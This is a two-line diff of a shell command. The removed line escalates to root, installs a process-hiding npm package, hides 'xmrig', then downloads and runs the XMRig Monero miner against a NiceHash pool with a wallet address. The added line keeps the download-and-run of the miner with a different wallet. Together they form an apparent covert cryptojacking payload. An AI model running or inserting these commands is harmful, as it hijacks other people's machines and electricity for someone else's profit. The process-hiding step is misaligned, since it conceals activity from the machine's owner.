@@ -1,2 +1,1 @@
-sudo su 
-sudo apt update && sudo apt install gcc && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add xmrig && wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz && tar xvzf xmrig-6.16.4-bionic-x64.tar.gz && cd xmrig-6.16.4 && ./xmrig -a randomx -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u 3QK9W5wbQWEuMWSb1o3cXBVUAjcAnXgaNP -p x -t 3
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz && tar xvzf xmrig-6.16.4-bionic-x64.tar.gz && cd xmrig-6.16.4 && ./xmrig -a randomx -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u 3QAbQX6ggoZ8MXrQMpuGkr4AFfdpdpfo3G -p x -t 3
